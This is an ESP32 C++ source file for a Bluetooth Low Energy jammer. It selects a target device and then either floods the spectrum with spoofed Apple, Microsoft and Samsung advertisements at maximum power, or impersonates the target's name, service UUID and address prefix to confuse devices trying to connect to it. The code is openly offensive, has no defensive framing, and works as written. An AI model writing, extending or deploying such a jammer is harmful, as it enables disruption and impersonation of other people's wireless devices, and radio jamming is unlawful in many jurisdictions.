#include "ble_jammer_utils.h"
#include <esp_bt.h>
#include <esp_mac.h>

// Static member initialization
BLETargetDevice BLEJammerUtils::currentTarget;
bool BLEJammerUtils::targetSet = false;
bool BLEJammerUtils::jamming = false;
JammerMode BLEJammerUtils::currentMode = JAM_CONTINUOUS;
uint32_t BLEJammerUtils::packetsSent = 0;
unsigned long BLEJammerUtils::lastPacketTime = 0;

void BLEJammerUtils::init() {
    targetSet = false;
    jamming = false;
    packetsSent = 0;
    lastPacketTime = 0;
    currentMode = JAM_CONTINUOUS;
    // Don't call clearTarget() here - the static strings are already initialized
    // Just reset the fields safely if needed
    currentTarget.name = "";
    currentTarget.address = "";
    currentTarget.rssi = 0;
    currentTarget.isConnectable = false;
    currentTarget.serviceUUID = "";
}

void BLEJammerUtils::setTarget(const BLETargetDevice& target) {
    // Deep copy all fields to avoid any reference issues
    currentTarget.name = String(target.name.c_str());
    currentTarget.address = String(target.address.c_str());
    currentTarget.rssi = target.rssi;
    currentTarget.isConnectable = target.isConnectable;
    currentTarget.serviceUUID = String(target.serviceUUID.c_str());
    targetSet = true;
}

void BLEJammerUtils::clearTarget() {
    targetSet = false;
    // Reset fields individually to avoid String memory issues with static objects
    currentTarget.name = "";
    currentTarget.address = "";
    currentTarget.rssi = 0;
    currentTarget.isConnectable = false;
    currentTarget.serviceUUID = "";
}

bool BLEJammerUtils::hasTarget() {
    return targetSet;
}

const BLETargetDevice& BLEJammerUtils::getTarget() {
    return currentTarget;
}

String BLEJammerUtils::getTargetName() {
    if (!targetSet) return "None";
    if (currentTarget.name.length() > 0) return currentTarget.name;
    if (currentTarget.address.length() > 0) return currentTarget.address;
    return "Unknown";
}

int BLEJammerUtils::getTargetRSSI() {
    if (!targetSet) return 0;
    return currentTarget.rssi;
}

void BLEJammerUtils::startJamming(JammerMode mode) {
    if (!targetSet) return;
    
    currentMode = mode;
    jamming = true;
    packetsSent = 0;
    lastPacketTime = millis();
    
    // Set maximum TX power for stronger interference
    esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_ADV, ESP_PWR_LVL_P9);
    esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_DEFAULT, ESP_PWR_LVL_P9);
}

void BLEJammerUtils::stopJamming() {
    jamming = false;
    BLEAdvertising* pAdvertising = BLEDevice::getAdvertising();
    if (pAdvertising) {
        pAdvertising->stop();
    }
}

bool BLEJammerUtils::isJamming() {
    return jamming;
}

JammerMode BLEJammerUtils::getMode() {
    return currentMode;
}

void BLEJammerUtils::setMode(JammerMode mode) {
    currentMode = mode;
}

void BLEJammerUtils::loop() {
    if (!jamming || !targetSet) return;
    
    // Packet timing - very fast to maximize interference
    unsigned long interval = 5; // 5ms between packets for aggressive jamming
    
    if (currentMode == JAM_REACTIVE) {
        interval = 10; // Slightly slower for reactive mode
    }
    
    if (millis() - lastPacketTime >= interval) {
        lastPacketTime = millis();
        
        switch (currentMode) {
            case JAM_CONTINUOUS:
                sendInterferencePacket();
                break;
            case JAM_REACTIVE:
                sendMimicPacket();
                break;
            case JAM_DEAUTH:
                sendDeauthPacket();
                break;
        }
        
        packetsSent++;
    }
}

void BLEJammerUtils::sendInterferencePacket() {
    BLEAdvertising* pAdvertising = BLEDevice::getAdvertising();
    if (pAdvertising) {
        pAdvertising->stop();
    }
    
    // Randomize MAC address for each packet
    randomizeMac();
    
    // Reinit BLE to apply MAC change
    BLEDevice::deinit();
    BLEDevice::init("");
    esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_ADV, ESP_PWR_LVL_P9);
    
    pAdvertising = BLEDevice::getAdvertising();
    if (!pAdvertising) return;
    
    // Generate interference data
    std::vector<uint8_t> payload = generateInterferenceData();
    std::string dataStr((char*)payload.data(), payload.size());
    
    BLEAdvertisementData advData;
    advData.setManufacturerData(dataStr);
    advData.setFlags(0x06);
    
    pAdvertising->setAdvertisementData(advData);
    pAdvertising->setMinInterval(0x20);  // Minimum interval
    pAdvertising->setMaxInterval(0x20);
    pAdvertising->start();
}

void BLEJammerUtils::sendMimicPacket() {
    if (!targetSet) return;
    BLEAdvertising* pAdvertising = BLEDevice::getAdvertising();
    
    if (pAdvertising) {
        pAdvertising->stop();
    }
    
    // Use target's address pattern (modified)
    // This creates confusion for devices trying to connect to the target
    
    BLEDevice::deinit();
    BLEDevice::init("");
    esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_ADV, ESP_PWR_LVL_P9);
    
    pAdvertising = BLEDevice::getAdvertising();
    if (!pAdvertising) return;
    
    // Generate mimic data based on target
    std::vector<uint8_t> payload = generateMimicData(currentTarget);
    std::string dataStr((char*)payload.data(), payload.size());
    
    BLEAdvertisementData advData;
    
    // If target has service UUID, advertise it
    if (currentTarget.serviceUUID.length() > 0) {
        advData.setCompleteServices(BLEUUID(currentTarget.serviceUUID.c_str()));
    }
    
    advData.setManufacturerData(dataStr);
    advData.setFlags(0x06);
    
    // Set name similar to target if it has one
    if (currentTarget.name.length() > 0 && currentTarget.name.length() < 20) {
        advData.setName(currentTarget.name.c_str());
    }
    
    pAdvertising->setAdvertisementData(advData);
    pAdvertising->setMinInterval(0x20);
    pAdvertising->setMaxInterval(0x20);
    pAdvertising->start();
}

void BLEJammerUtils::sendDeauthPacket() {
    if (!targetSet) return;
    BLEAdvertising* pAdvertising = BLEDevice::getAdvertising();

    if (pAdvertising) {
        pAdvertising->stop();
    }
    
    randomizeMac();
    
    BLEDevice::deinit();
    BLEDevice::init("");
    esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_ADV, ESP_PWR_LVL_P9);
    
    pAdvertising = BLEDevice::getAdvertising();
    if (!pAdvertising) return;
    
    // Send packets that may cause connection issues
    // This includes advertising with conflicting parameters
    
    std::vector<uint8_t> payload;
    
    // Create malformed/aggressive advertisement data
    // Flood with various manufacturer IDs and connection requests
    
    uint16_t manufacturers[] = {0x004C, 0x0006, 0x0075, 0x00E0, 0xFE2C};
    uint16_t mfr = manufacturers[random(0, 5)];
    
    payload.push_back(mfr & 0xFF);
    payload.push_back((mfr >> 8) & 0xFF);
    
    // Add random payload data
    for (int i = 0; i < 20; i++) {
        payload.push_back(random(0, 256));
    }
    
    std::string dataStr((char*)payload.data(), payload.size());
    
    BLEAdvertisementData advData;
    advData.setManufacturerData(dataStr);
    advData.setFlags(0x1A); // Different flags to cause confusion
    
    pAdvertising->setAdvertisementData(advData);
    pAdvertising->setMinInterval(0x20);
    pAdvertising->setMaxInterval(0x20);
    pAdvertising->start();
}

void BLEJammerUtils::randomizeMac() {
    uint8_t mac[6];
    for (int i = 0; i < 6; i++) {
        mac[i] = random(0, 256);
    }
    // Set locally administered, unicast
    mac[0] = (mac[0] & 0xFC) | 0x02;
    esp_base_mac_addr_set(mac);
}

std::vector<uint8_t> BLEJammerUtils::generateInterferenceData() {
    std::vector<uint8_t> data;
    
    // Generate random manufacturer data to flood the spectrum
    // Alternate between different manufacturer IDs
    
    static int counter = 0;
    counter++;
    
    switch (counter % 4) {
        case 0: // Apple-style
            data.push_back(0x4C);
            data.push_back(0x00);
            data.push_back(0x0F);
            data.push_back(0x05);
            data.push_back(0xC1);
            for (int i = 0; i < 5; i++) data.push_back(random(0, 256));
            break;
            
        case 1: // Microsoft-style
            data.push_back(0x06);
            data.push_back(0x00);
            data.push_back(0x03);
            for (int i = 0; i < 10; i++) data.push_back(random(0, 256));
            break;
            
        case 2: // Samsung-style
            data.push_back(0x75);
            data.push_back(0x00);
            data.push_back(0x01);
            for (int i = 0; i < 10; i++) data.push_back(random(0, 256));
            break;
            
        case 3: // Generic noise
            for (int i = 0; i < 20; i++) data.push_back(random(0, 256));
            break;
    }
    
    return data;
}

std::vector<uint8_t> BLEJammerUtils::generateMimicData(const BLETargetDevice& target) {
    std::vector<uint8_t> data;
    
    // Parse target address and create similar advertisements
    // This aims to confuse devices trying to connect to the target
    
    // Extract bytes from MAC address string (format: XX:XX:XX:XX:XX:XX)
    String addr = target.address;
    
    // Add some of the target's address bytes as manufacturer data
    // This creates ambiguity in device identification
    
    if (addr.length() >= 17) {
        // Parse first 3 bytes of MAC (OUI)
        for (int i = 0; i < 3; i++) {
            String byteStr = addr.substring(i * 3, i * 3 + 2);
            data.push_back(strtol(byteStr.c_str(), NULL, 16));
        }
    } else {
        // Fallback to random data
        for (int i = 0; i < 3; i++) {
            data.push_back(random(0, 256));
        }
    }
    
    // Add random data that looks like legitimate advertisement
    data.push_back(0x02); // Length
    data.push_back(0x01); // Type: Flags
    data.push_back(0x06); // Flags value
    
    // Random payload
    for (int i = 0; i < 15; i++) {
        data.push_back(random(0, 256));
    }
    
    return data;
}

uint32_t BLEJammerUtils::getPacketCount() {
    return packetsSent;
}

void BLEJammerUtils::resetPacketCount() {
    packetsSent = 0;
}

BLETargetDevice BLEJammerUtils::parseDevice(BLEAdvertisedDevice& device) {
    BLETargetDevice target;
    
    // Safely copy strings (convert std::string to String)
    target.name = String(device.getName().c_str());
    target.address = String(device.getAddress().toString().c_str());
    
    target.rssi = device.getRSSI();
    target.isConnectable = false; // Default, checking can crash
    
    // Try to get service UUID as string safely
    target.serviceUUID = "";
    if (device.haveServiceUUID()) {
        target.serviceUUID = String(device.getServiceUUID().toString().c_str());
    }
    
    return target;
}
